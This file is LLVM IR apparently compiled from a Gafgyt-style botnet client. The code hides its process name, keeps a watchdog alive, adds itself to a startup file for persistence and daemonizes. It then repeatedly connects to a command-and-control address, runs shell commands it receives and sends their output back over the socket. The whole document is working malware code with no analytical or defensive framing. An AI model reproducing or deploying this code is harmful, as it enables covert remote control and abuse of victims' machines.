; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 4096, i32 16, i1 false)
  %3 = load i32, i32* @mainCommSock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #3
  store i32 0, i32* @mainCommSock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i8*, i8** @cncip, align 8
  %9 = call i8* @strcpy(i8* nonnull %2, i8* %8) #3
  %10 = call i32 @socket(i32 2, i32 1, i32 0) #3
  store i32 %10, i32* @mainCommSock, align 4
  %11 = load i32, i32* @cncport, align 4
  %12 = call i32 @connectTimeout(i32 %10, i8* nonnull %2, i32 %11, i32 30)
  %13 = icmp eq i32 %12, 0
  %. = zext i1 %13 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() local_unnamed_addr #1 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca %struct.ifreq, align 8
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #3
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %46, label %8

; <label>:8:                                      ; preds = %0
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 3, i64 0
  %10 = bitcast i8* %9 to i64*
  store i64 0, i64* %10, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.128, i64 0, i64 0)) #3
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %12, i32* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 53) #18
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %17 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %16, i32 16) #3
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %46, label %19

; <label>:19:                                     ; preds = %8
  store i32 16, i32* %3, align 4
  %20 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %21 = call i32 @getsockname(i32 %6, %struct.sockaddr* nonnull %20, i32* nonnull %3) #3
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %46, label %23

; <label>:23:                                     ; preds = %19
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %25 = load i32, i32* %24, align 4
  store i32 %25, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %26 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.129, i64 0, i64 0), i32 0) #3
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %28 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %29 = icmp eq i8* %28, null
  br i1 %29, label %.loopexit17, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %23
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %36
  %30 = call i8* @strstr(i8* nonnull %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.130, i64 0, i64 0)) #16
  %31 = icmp eq i8* %30, null
  br i1 %31, label %36, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.015 = phi i8* [ %34, %.preheader ], [ %27, %.preheader.preheader ]
  %32 = load i8, i8* %.015, align 1
  %33 = icmp eq i8 %32, 9
  %34 = getelementptr inbounds i8, i8* %.015, i64 1
  br i1 %33, label %35, label %.preheader

; <label>:35:                                     ; preds = %.preheader
  store i8 0, i8* %.015, align 1
  br label %.loopexit17

; <label>:36:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %27, i8 0, i64 4096, i32 16, i1 false)
  %37 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit17.loopexit, label %.lr.ph

.loopexit17.loopexit:                             ; preds = %36
  br label %.loopexit17

.loopexit17:                                      ; preds = %.loopexit17.loopexit, %23, %35
  %39 = call i32 @close(i32 %26) #3
  %40 = load i8, i8* %27, align 16
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %.loopexit, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.loopexit17
  %42 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 0, i32 0, i64 0
  %43 = call i8* @strcpy(i8* nonnull %42, i8* nonnull %27) #3
  %44 = call i32 (i32, i64, ...) @ioctl(i32 %6, i64 35111, %struct.ifreq* nonnull %5) #3
  %scevgep = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 1, i32 0, i32 0
  %scevgep20 = bitcast i64* %scevgep to i8*
  %uglygep = getelementptr inbounds i8, i8* %scevgep20, i64 2
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), i8* %uglygep, i64 6, i32 1, i1 false)
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit17
  %45 = call i32 @close(i32 %6) #3
  br label %46

; <label>:46:                                     ; preds = %19, %8, %0, %.loopexit
  ret i32 0
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8** nocapture) local_unnamed_addr #1 {
  %3 = alloca i32, align 4
  %4 = alloca [256 x i8], align 16
  %5 = alloca [256 x i8], align 16
  %6 = alloca [1024 x i8], align 16
  %7 = alloca [4096 x i8], align 16
  %8 = alloca [1024 x i8], align 16
  %9 = alloca [10 x i8*], align 16
  %10 = load i8*, i8** %1, align 8
  %11 = tail call i64 @strlen(i8* %10) #16
  tail call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 %11, i32 1, i1 false)
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i64 0, i64 0), i8** %1, align 8
  %12 = tail call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 ptrtoint ([1 x i8]* @.str.91 to i64), i32 0, i32 0, i32 0) #3
  %13 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %14 = tail call i32 @getpid() #3
  %15 = xor i32 %14, %13
  tail call void @srand(i32 %15) #3
  %16 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %17 = tail call i32 @getpid() #3
  %18 = xor i32 %17, %16
  tail call void @init_rand(i32 %18)
  %19 = tail call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.131, i64 0, i64 0))
  %20 = tail call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.132, i64 0, i64 0))
  %21 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.133, i64 0, i64 0), i32 2) #3
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %23, label %26

; <label>:23:                                     ; preds = %2
  %24 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.134, i64 0, i64 0), i32 2) #3
  %25 = icmp eq i32 %24, -1
  br i1 %25, label %32, label %26

; <label>:26:                                     ; preds = %23, %2
  %.087 = phi i32 [ %21, %2 ], [ %24, %23 ]
  store i32 1, i32* %3, align 4
  %27 = call i32 (i32, i64, ...) @ioctl(i32 %.087, i64 2147768068, i32* nonnull %3) #3
  %28 = call i32 @fork() #3
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %.preheader110.preheader, label %32

.preheader110.preheader:                          ; preds = %26
  br label %.preheader110

.preheader110:                                    ; preds = %.preheader110.preheader, %.preheader110
  %30 = call i32 (i32, i64, ...) @ioctl(i32 %.087, i64 2147768069, i32 0) #3
  %31 = call i32 @sleep(i32 10) #3
  br label %.preheader110

; <label>:32:                                     ; preds = %23, %26
  %33 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.135, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i64 0, i64 0))
  %34 = icmp eq %struct._IO_FILE* %33, null
  br i1 %34, label %35, label %.thread

; <label>:35:                                     ; preds = %32
  %36 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.137, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i64 0, i64 0))
  %37 = icmp eq %struct._IO_FILE* %36, null
  br i1 %37, label %74, label %.thread

.thread:                                          ; preds = %32, %35
  %.089101 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @.str.137, i64 0, i64 0), %35 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @.str.135, i64 0, i64 0), %32 ]
  %.094100 = phi %struct._IO_FILE* [ %36, %35 ], [ %33, %32 ]
  %38 = load i8*, i8** %1, align 8
  %39 = call i64 @strlen(i8* %38) #16
  %40 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 0
  %41 = call i8* @getcwd(i8* nonnull %40, i64 256) #3
  %42 = call i32 @strcmp(i8* nonnull %40, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i64 0, i64 0)) #16
  %43 = icmp eq i32 %42, 0
  br i1 %43, label %72, label %.preheader109

.preheader109:                                    ; preds = %.thread
  %44 = load i8*, i8** %1, align 8
  %sext = shl i64 %39, 32
  %45 = ashr exact i64 %sext, 32
  br label %46

; <label>:46:                                     ; preds = %46, %.preheader109
  %indvars.iv156 = phi i64 [ %indvars.iv.next157, %46 ], [ %45, %.preheader109 ]
  %47 = getelementptr inbounds i8, i8* %44, i64 %indvars.iv156
  %48 = load i8, i8* %47, align 1
  %49 = icmp eq i8 %48, 47
  %indvars.iv.next157 = add i64 %indvars.iv156, -1
  br i1 %49, label %50, label %46

; <label>:50:                                     ; preds = %46
  %51 = getelementptr inbounds [256 x i8], [256 x i8]* %5, i64 0, i64 0
  %52 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %51, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.138, i64 0, i64 0), i8* nonnull %40, i8* %47) #3
  %53 = call i32 @feof(%struct._IO_FILE* nonnull %.094100) #3
  %54 = icmp eq i32 %53, 0
  br i1 %54, label %.lr.ph143, label %._crit_edge144.thread

._crit_edge144.thread:                            ; preds = %50
  %55 = call i32 @fclose(%struct._IO_FILE* nonnull %.094100)
  br label %66

.lr.ph143:                                        ; preds = %50
  %56 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  br label %57

; <label>:57:                                     ; preds = %.lr.ph143, %57
  %.097141 = phi i32 [ 0, %.lr.ph143 ], [ %..097, %57 ]
  %58 = call i8* @fgets(i8* nonnull %56, i32 1024, %struct._IO_FILE* nonnull %.094100)
  %59 = call i32 @strcasecmp(i8* nonnull %56, i8* nonnull %51) #16
  %60 = icmp eq i32 %59, 0
  %61 = zext i1 %60 to i32
  %..097 = add nsw i32 %61, %.097141
  %62 = call i32 @feof(%struct._IO_FILE* nonnull %.094100) #3
  %63 = icmp eq i32 %62, 0
  br i1 %63, label %57, label %._crit_edge144

._crit_edge144:                                   ; preds = %57
  %64 = icmp eq i32 %..097, 0
  %65 = call i32 @fclose(%struct._IO_FILE* nonnull %.094100)
  br i1 %64, label %66, label %74

; <label>:66:                                     ; preds = %._crit_edge144.thread, %._crit_edge144
  %67 = call %struct._IO_FILE* @fopen(i8* %.089101, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.139, i64 0, i64 0))
  %68 = icmp eq %struct._IO_FILE* %67, null
  br i1 %68, label %74, label %69

; <label>:69:                                     ; preds = %66
  %70 = call i32 @fputs(i8* nonnull %51, %struct._IO_FILE* nonnull %67)
  %71 = call i32 @fclose(%struct._IO_FILE* nonnull %67)
  br label %74

; <label>:72:                                     ; preds = %.thread
  %73 = call i32 @fclose(%struct._IO_FILE* nonnull %.094100)
  br label %74

; <label>:74:                                     ; preds = %66, %35, %72, %._crit_edge144, %69
  %75 = call i32 @getOurIP()
  %76 = call i32 @fork() #3
  %77 = icmp sgt i32 %76, 0
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %74
  ret i32 0

; <label>:79:                                     ; preds = %74
  %80 = call i32 @setsid() #3
  store i32 %80, i32* @pgid, align 4
  %81 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i64 0, i64 0)) #3
  %82 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #3
  %83 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 0
  %84 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 1
  %85 = getelementptr inbounds [10 x i8*], [10 x i8*]* %9, i64 0, i64 0
  br label %.backedge108

.backedge108.loopexit:                            ; preds = %.backedge
  br label %.backedge108.backedge

.backedge108:                                     ; preds = %.backedge108.backedge, %79
  %86 = call i32 @initConnection()
  %87 = icmp eq i32 %86, 0
  br i1 %87, label %90, label %88

; <label>:88:                                     ; preds = %.backedge108
  %89 = call i32 @sleep(i32 5) #3
  br label %.backedge108.backedge

; <label>:90:                                     ; preds = %.backedge108
  %91 = load i32, i32* @mainCommSock, align 4
  %92 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %93 = call i8* @inet_ntoa(i32 %92) #3
  %94 = call i32 (i32, i8*, ...) @sockprintf(i32 %91, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.140, i64 0, i64 0), i8* %93, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.141, i64 0, i64 0))
  %95 = load i32, i32* @mainCommSock, align 4
  %96 = call i32 @recvLine(i32 %95, i8* nonnull %83, i32 4096)
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %.backedge108.backedge, label %.preheader106.preheader

.backedge108.backedge:                            ; preds = %90, %88, %.backedge108.loopexit
  br label %.backedge108

.preheader106.preheader:                          ; preds = %90
  br label %.preheader106

.preheader106:                                    ; preds = %.preheader106.preheader, %.backedge
  %98 = phi i32 [ %148, %.backedge ], [ %96, %.preheader106.preheader ]
  %99 = load i64, i64* @numpids, align 8
  %100 = icmp eq i64 %99, 0
  br i1 %100, label %._crit_edge128, label %.lr.ph127.preheader

.lr.ph127.preheader:                              ; preds = %.preheader106
  br label %.lr.ph127

.lr.ph127:                                        ; preds = %.lr.ph127.preheader, %.lr.ph127._crit_edge
  %indvars.iv = phi i64 [ %106, %.lr.ph127._crit_edge ], [ 0, %.lr.ph127.preheader ]
  %101 = load i32*, i32** @pids, align 8
  %102 = getelementptr inbounds i32, i32* %101, i64 %indvars.iv
  %103 = load i32, i32* %102, align 4
  %104 = call i32 @waitpid(i32 %103, i32* null, i32 1) #3
  %105 = icmp sgt i32 %104, 0
  %106 = add nuw i64 %indvars.iv, 1
  br i1 %105, label %.preheader, label %.lr.ph127._crit_edge

.preheader:                                       ; preds = %.lr.ph127
  %107 = load i64, i64* @numpids, align 8
  %108 = icmp ult i64 %106, %107
  %109 = load i32*, i32** @pids, align 8
  %110 = trunc i64 %indvars.iv to i32
  br i1 %108, label %.lr.ph118.preheader, label %._crit_edge119

.lr.ph118.preheader:                              ; preds = %.preheader
  %111 = trunc i64 %106 to i32
  br label %.lr.ph118

.lr.ph118:                                        ; preds = %.lr.ph118.preheader, %.lr.ph118
  %112 = phi i32* [ %121, %.lr.ph118 ], [ %109, %.lr.ph118.preheader ]
  %113 = phi i64 [ %118, %.lr.ph118 ], [ %106, %.lr.ph118.preheader ]
  %.092117 = phi i32 [ %.092, %.lr.ph118 ], [ %111, %.lr.ph118.preheader ]
  %.092.in116 = phi i32 [ %.092117, %.lr.ph118 ], [ %110, %.lr.ph118.preheader ]
  %114 = getelementptr inbounds i32, i32* %112, i64 %113
  %115 = load i32, i32* %114, align 4
  %116 = zext i32 %.092.in116 to i64
  %117 = getelementptr inbounds i32, i32* %112, i64 %116
  store i32 %115, i32* %117, align 4
  %.092 = add i32 %.092117, 1
  %118 = zext i32 %.092 to i64
  %119 = load i64, i64* @numpids, align 8
  %120 = icmp ult i64 %118, %119
  %121 = load i32*, i32** @pids, align 8
  br i1 %120, label %.lr.ph118, label %._crit_edge119.loopexit

._crit_edge119.loopexit:                          ; preds = %.lr.ph118
  br label %._crit_edge119

._crit_edge119:                                   ; preds = %._crit_edge119.loopexit, %.preheader
  %.092.in.lcssa = phi i32 [ %110, %.preheader ], [ %.092117, %._crit_edge119.loopexit ]
  %.lcssa = phi i32* [ %109, %.preheader ], [ %121, %._crit_edge119.loopexit ]
  %122 = zext i32 %.092.in.lcssa to i64
  %123 = getelementptr inbounds i32, i32* %.lcssa, i64 %122
  store i32 0, i32* %123, align 4
  %124 = load i64, i64* @numpids, align 8
  %125 = add i64 %124, -1
  store i64 %125, i64* @numpids, align 8
  %126 = shl i64 %124, 2
  %127 = call noalias i8* @malloc(i64 %126) #3
  %128 = bitcast i8* %127 to i32*
  %129 = icmp eq i64 %125, 0
  %130 = load i32*, i32** @pids, align 8
  br i1 %129, label %._crit_edge124, label %.lr.ph123.preheader

.lr.ph123.preheader:                              ; preds = %._crit_edge119
  br label %.lr.ph123

.lr.ph123:                                        ; preds = %.lr.ph123.preheader, %.lr.ph123
  %131 = phi i64 [ %136, %.lr.ph123 ], [ 0, %.lr.ph123.preheader ]
  %.193121 = phi i32 [ %135, %.lr.ph123 ], [ 0, %.lr.ph123.preheader ]
  %132 = getelementptr inbounds i32, i32* %130, i64 %131
  %133 = load i32, i32* %132, align 4
  %134 = getelementptr inbounds i32, i32* %128, i64 %131
  store i32 %133, i32* %134, align 4
  %135 = add i32 %.193121, 1
  %136 = zext i32 %135 to i64
  %137 = icmp ult i64 %136, %125
  br i1 %137, label %.lr.ph123, label %._crit_edge124.loopexit

._crit_edge124.loopexit:                          ; preds = %.lr.ph123
  br label %._crit_edge124

._crit_edge124:                                   ; preds = %._crit_edge124.loopexit, %._crit_edge119
  %138 = bitcast i32* %130 to i8*
  call void @free(i8* %138) #3
  store i8* %127, i8** bitcast (i32** @pids to i8**), align 8
  br label %.lr.ph127._crit_edge

.lr.ph127._crit_edge:                             ; preds = %.lr.ph127, %._crit_edge124
  %sext158 = shl i64 %106, 32
  %139 = ashr exact i64 %sext158, 32
  %140 = load i64, i64* @numpids, align 8
  %141 = icmp ult i64 %139, %140
  br i1 %141, label %.lr.ph127, label %._crit_edge128.loopexit

._crit_edge128.loopexit:                          ; preds = %.lr.ph127._crit_edge
  br label %._crit_edge128

._crit_edge128:                                   ; preds = %._crit_edge128.loopexit, %.preheader106
  %142 = sext i32 %98 to i64
  %143 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 %142
  store i8 0, i8* %143, align 1
  call void @trim(i8* nonnull %83)
  %strncmp = call i32 @strncmp(i8* nonnull %83, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0), i64 4)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %144, label %150

; <label>:144:                                    ; preds = %._crit_edge128
  %145 = load i32, i32* @mainCommSock, align 4
  %146 = call i32 (i32, i8*, ...) @sockprintf(i32 %145, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.142, i64 0, i64 0))
  br label %.backedge

.backedge.loopexit:                               ; preds = %.lr.ph140
  br label %.backedge

.backedge.loopexit169:                            ; preds = %.preheader146
  br label %.backedge

.backedge:                                        ; preds = %.backedge.loopexit169, %.backedge.loopexit, %._crit_edge137.thread, %144, %._crit_edge137, %150, %182
  %147 = load i32, i32* @mainCommSock, align 4
  %148 = call i32 @recvLine(i32 %147, i8* nonnull %83, i32 4096)
  %149 = icmp eq i32 %148, -1
  br i1 %149, label %.backedge108.loopexit, label %.preheader106

; <label>:150:                                    ; preds = %._crit_edge128
  %151 = load i8, i8* %83, align 16
  %152 = icmp eq i8 %151, 33
  br i1 %152, label %.preheader146.preheader, label %.backedge

.preheader146.preheader:                          ; preds = %150
  br label %.preheader146

.preheader146:                                    ; preds = %.preheader146.preheader, %154
  %.090 = phi i8* [ %155, %154 ], [ %84, %.preheader146.preheader ]
  %153 = load i8, i8* %.090, align 1
  switch i8 %153, label %154 [
    i8 0, label %.backedge.loopexit169
    i8 32, label %156
  ]

; <label>:154:                                    ; preds = %.preheader146
  %155 = getelementptr inbounds i8, i8* %.090, i64 1
  br label %.preheader146

; <label>:156:                                    ; preds = %.preheader146
  store i8 0, i8* %.090, align 1
  %157 = call i64 @strlen(i8* %84) #16
  %158 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 %157
  %159 = getelementptr inbounds i8, i8* %158, i64 2
  br label %160

; <label>:160:                                    ; preds = %165, %156
  %161 = call i64 @strlen(i8* %159) #16
  %162 = add i64 %161, -1
  %163 = getelementptr inbounds i8, i8* %159, i64 %162
  %164 = load i8, i8* %163, align 1
  switch i8 %164, label %.preheader104.preheader [
    i8 13, label %165
    i8 10, label %165
  ]

.preheader104.preheader:                          ; preds = %160
  br label %.preheader104

; <label>:165:                                    ; preds = %160, %160
  store i8 0, i8* %163, align 1
  br label %160

.preheader104:                                    ; preds = %.preheader104.preheader, %167
  %.091 = phi i8* [ %168, %167 ], [ %159, %.preheader104.preheader ]
  %166 = load i8, i8* %.091, align 1
  switch i8 %166, label %167 [
    i8 32, label %169
    i8 0, label %169
  ]

; <label>:167:                                    ; preds = %.preheader104
  %168 = getelementptr inbounds i8, i8* %.091, i64 1
  br label %.preheader104

; <label>:169:                                    ; preds = %.preheader104, %.preheader104
  store i8 0, i8* %.091, align 1
  %170 = getelementptr inbounds i8, i8* %.091, i64 1
  %171 = load i8, i8* %159, align 1
  %172 = icmp eq i8 %171, 0
  br i1 %172, label %._crit_edge132, label %.lr.ph131.preheader

.lr.ph131.preheader:                              ; preds = %169
  br label %.lr.ph131

.lr.ph131:                                        ; preds = %.lr.ph131.preheader, %.lr.ph131
  %173 = phi i8 [ %178, %.lr.ph131 ], [ %171, %.lr.ph131.preheader ]
  %.088129 = phi i8* [ %177, %.lr.ph131 ], [ %159, %.lr.ph131.preheader ]
  %174 = zext i8 %173 to i32
  %175 = call i32 @toupper(i32 %174) #16
  %176 = trunc i32 %175 to i8
  store i8 %176, i8* %.088129, align 1
  %177 = getelementptr inbounds i8, i8* %.088129, i64 1
  %178 = load i8, i8* %177, align 1
  %179 = icmp eq i8 %178, 0
  br i1 %179, label %._crit_edge132.loopexit, label %.lr.ph131

._crit_edge132.loopexit:                          ; preds = %.lr.ph131
  br label %._crit_edge132

._crit_edge132:                                   ; preds = %._crit_edge132.loopexit, %169
  %180 = call i32 @strcmp(i8* %159, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.143, i64 0, i64 0)) #16
  %181 = icmp eq i32 %180, 0
  br i1 %181, label %182, label %197

; <label>:182:                                    ; preds = %._crit_edge132
  %183 = call i32 @listFork()
  %184 = icmp eq i32 %183, 0
  br i1 %184, label %185, label %.backedge

; <label>:185:                                    ; preds = %182
  %186 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %186, i8 0, i64 1024, i32 16, i1 false)
  %187 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %186, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.144, i64 0, i64 0), i8* %170)
  %188 = call i32 @fdpopen(i8* nonnull %186, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i64 0, i64 0))
  %189 = call i8* @fdgets(i8* nonnull %186, i32 1024, i32 %188)
  %190 = icmp eq i8* %189, null
  br i1 %190, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %185
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  call void @trim(i8* nonnull %186)
  %191 = load i32, i32* @mainCommSock, align 4
  %192 = call i32 (i32, i8*, ...) @sockprintf(i32 %191, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.145, i64 0, i64 0), i8* nonnull %186)
  call void @llvm.memset.p0i8.i64(i8* nonnull %186, i8 0, i64 1024, i32 16, i1 false)
  %193 = call i32 @sleep(i32 1) #3
  %194 = call i8* @fdgets(i8* nonnull %186, i32 1024, i32 %188)
  %195 = icmp eq i8* %194, null
  br i1 %195, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %185
  %196 = call i32 @fdpclose(i32 %188)
  call void @exit(i32 0) #15
  unreachable

; <label>:197:                                    ; preds = %._crit_edge132
  %198 = call i8* @strtok(i8* %170, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.146, i64 0, i64 0)) #3
  store i8* %159, i8** %85, align 16
  %199 = icmp eq i8* %198, null
  br i1 %199, label %._crit_edge137.thread, label %.lr.ph136.preheader

.lr.ph136.preheader:                              ; preds = %197
  br label %.lr.ph136

._crit_edge137.thread:                            ; preds = %197
  call void @processCmd(i32 1, i8** nonnull %85)
  br label %.backedge

.lr.ph136:                                        ; preds = %.lr.ph136.preheader, %212
  %.085134 = phi i8* [ %213, %212 ], [ %198, %.lr.ph136.preheader ]
  %.086133 = phi i32 [ %.1, %212 ], [ 1, %.lr.ph136.preheader ]
  %200 = load i8, i8* %.085134, align 1
  %201 = icmp eq i8 %200, 10
  br i1 %201, label %212, label %202

; <label>:202:                                    ; preds = %.lr.ph136
  %203 = call i64 @strlen(i8* nonnull %.085134) #16
  %204 = add i64 %203, 1
  %205 = call noalias i8* @malloc(i64 %204) #3
  %206 = sext i32 %.086133 to i64
  %207 = getelementptr inbounds [10 x i8*], [10 x i8*]* %9, i64 0, i64 %206
  store i8* %205, i8** %207, align 8
  %208 = call i64 @strlen(i8* nonnull %.085134) #16
  %209 = add i64 %208, 1
  call void @llvm.memset.p0i8.i64(i8* %205, i8 0, i64 %209, i32 1, i1 false)
  %210 = call i8* @strcpy(i8* %205, i8* nonnull %.085134) #3
  %211 = add nsw i32 %.086133, 1
  br label %212

; <label>:212:                                    ; preds = %.lr.ph136, %202
  %.1 = phi i32 [ %211, %202 ], [ %.086133, %.lr.ph136 ]
  %213 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.146, i64 0, i64 0)) #3
  %214 = icmp eq i8* %213, null
  br i1 %214, label %._crit_edge137, label %.lr.ph136

._crit_edge137:                                   ; preds = %212
  call void @processCmd(i32 %.1, i8** nonnull %85)
  %215 = icmp sgt i32 %.1, 1
  br i1 %215, label %.lr.ph140.preheader, label %.backedge

.lr.ph140.preheader:                              ; preds = %._crit_edge137
  %wide.trip.count = zext i32 %.1 to i64
  br label %.lr.ph140

.lr.ph140:                                        ; preds = %.lr.ph140.preheader, %.lr.ph140
  %indvars.iv154 = phi i64 [ %indvars.iv.next155, %.lr.ph140 ], [ 1, %.lr.ph140.preheader ]
  %216 = getelementptr inbounds [10 x i8*], [10 x i8*]* %9, i64 0, i64 %indvars.iv154
  %217 = load i8*, i8** %216, align 8
  call void @free(i8* %217) #3
  %indvars.iv.next155 = add nuw nsw i64 %indvars.iv154, 1
  %exitcond = icmp eq i64 %indvars.iv.next155, %wide.trip.count
  br i1 %exitcond, label %.backedge.loopexit, label %.lr.ph140
}

declare i32 @prctl(...) local_unnamed_addr #4

; Function Attrs: nounwind
declare noalias %struct._IO_FILE* @fopen(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @getcwd(i8*, i64) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @fgets(i8*, i32, %struct._IO_FILE* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @strcasecmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @fclose(%struct._IO_FILE* nocapture) local_unnamed_addr #5

